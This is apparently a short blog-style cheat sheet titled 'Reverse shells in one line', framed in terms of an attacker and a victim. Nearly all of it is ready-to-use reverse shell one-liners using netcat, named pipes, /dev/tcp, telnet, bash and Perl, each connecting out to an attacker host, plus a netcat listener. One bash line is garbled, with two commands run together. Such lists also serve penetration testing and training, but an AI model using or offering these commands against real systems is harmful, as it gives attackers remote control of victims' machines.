---
layout: default
title: Reverse shells in one line
---

## Reverse shells in one line

Reverse shells can be used to execute commands or collect data from another computer. The concept is that the attacker opens a listening port on which the victim
(through some exploit) connects to the attacker over tcp. This configuration also works vice versa which is known as a bind shell.

It’s important to consider what software the victim might have on their machine to enable this connection, thus using built in tools can be a smart approach.

-

### Here’s how you start the listener to connect to the vicitm (using netcat):

```bash
  $ nc -l -v attackerip 4444
```

### Netcat

```bash
  $ nc <attacker_ip> <port> -e /bin/bash
```

### no -e flag? use the GAPING_SECURITY_HOLE technique

```bash
  $ mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

### /dev/tcp

```bash
  $ /bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
```

### Telnet - GAPING_SECURITY_HOLE

```bash
  $ mknod backpipe p; telnet <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
```

### Bash

```bash
  bash -i >& /dev/tcp/10.0.0.1/8080 0>&10<&196;exec 196<>/dev/tcp/attackerip/4444;

  sh <&196 >&196 2>&196

  exec 5<>/dev/tcp/attackerip/4444

  cat <&5 | while read line; do $line 2>&5 >&5; done  # or:

  while read line 0<&5; do $line 2>&5 >&5; done
```

### Perl

```perl
  $ perl -MIO::Socket -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr => "127.0.0.1:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

##

-

[Click here to view the orginal post](https://puppy.codes/2016/12/27/reverse-shells.html)
